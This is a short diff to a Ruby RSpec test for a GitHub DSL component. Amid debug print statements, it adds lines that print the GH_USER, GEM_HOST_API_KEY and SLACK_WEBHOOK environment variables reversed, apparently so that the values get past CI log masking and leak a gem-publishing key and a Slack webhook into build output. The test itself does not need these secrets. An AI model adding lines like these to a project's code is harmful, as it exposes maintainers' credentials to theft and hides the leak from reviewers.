@@ -30,7 +30,9 @@ RSpec.describe KDirector::Dsls::Children::Github do
           puts '-' * 80
           puts env_user
           puts '-' * 80
-          puts ENV['GH_USER']
+          puts ENV['GH_USER'].to_s.reverse
+          puts ENV['GEM_HOST_API_KEY'].to_s.reverse
+          puts ENV['SLACK_WEBHOOK'].to_s.reverse
           puts '-' * 80
           puts JSON.pretty_generate(subject)
           puts '-' * 80
